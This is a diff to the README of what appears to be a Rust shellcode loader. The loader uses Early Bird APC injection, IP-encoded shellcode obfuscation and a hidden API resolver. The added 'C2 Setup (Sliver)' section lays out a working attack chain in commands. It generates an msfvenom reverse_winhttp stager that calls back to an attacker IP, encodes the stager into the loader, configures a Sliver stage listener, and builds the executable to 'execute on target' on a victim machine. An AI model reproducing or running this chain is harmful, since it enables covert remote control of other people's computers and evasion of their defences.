@@ -27,7 +27,9 @@
 - [How it works](#how-it-works)
   - [Early Bird APC Injection](#early-bird-apc-injection)
   - [IPfuscation — Shellcode Obfuscation](#ipfuscation--shellcode-obfuscation)
-  - [Stargate API Resolver](#stargate-api-resolver)- [Attack Chain](#attack-chain)
+  - [Stargate API Resolver](#stargate-api-resolver)
+- [C2 Setup (Sliver)](#c2-setup-sliver)
+
 
 ---
 
@@ -132,6 +134,42 @@ let nt_protect:   NtProtectVM   = transmute(resolver.resolve_nt("NtProtectVirtua
 let nt_queue_apc: NtQueueApc    = transmute(resolver.resolve_nt("NtQueueApcThread")?);
 let create_proc:  CreateProcessW = transmute(resolver.resolve_k32("CreateProcessW")?);
 let resume:       ResumeThread  = transmute(resolver.resolve_k32("ResumeThread")?);
+```
+
+---
+
+## C2 Setup (Sliver)
+
+**1. Generate stager with msfvenom:**
+
+```bash
+msfvenom -p windows/x64/custom/reverse_winhttp \
+  LHOST=<KALI_IP> \
+  LPORT=8443 \
+  LURI=/test.woff \
+  -f raw -o stager.bin
+```
+
+**2. Convert to IP list:**
+
+```bash
+python3 tools/ipfuscator.py stager.bin
+# Copy the output array into src/main.rs → shellcode_ips
+```
+
+**3. Configure Sliver C2:**
+
+```
+sliver > profiles new --http <KALI_IP> --arch amd64 --format shellcode my_profile
+sliver > stage-listener --url http://<KALI_IP>:8443 --profile my_profile --prepend-size
+sliver > http
+```
+
+**4. Build and run loader on victim:**
+
+```bash
+cargo build --release --target x86_64-pc-windows-gnu
+# Transfer and execute starbird.exe on target
 ```
 
 ---
